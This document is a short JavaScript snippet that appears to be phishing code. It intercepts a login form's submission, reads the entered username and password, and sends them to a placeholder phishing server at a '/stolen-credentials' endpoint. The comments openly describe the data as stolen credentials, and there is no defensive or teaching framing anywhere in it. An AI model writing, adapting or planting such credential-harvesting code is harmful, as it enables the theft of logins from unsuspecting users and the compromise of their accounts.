document.getElementById('login-form').addEventListener('submit', function(event) {
  event.preventDefault();
  
  let username = document.getElementById('username').value;
  let password = document.getElementById('password').value;
  
  // Send the stolen credentials to your server
  sendCredentials(username, password);
});

function sendCredentials(username, password) {
  // Use fetch or another method to send the data to your server
  fetch('https://your-phishing-server.com/stolen-credentials', {
    method: 'POST',
    body: JSON.stringify({
      username: username,
      password: password
    }),
    headers: {
      'Content-Type': 'application/json'
    }
  });
}
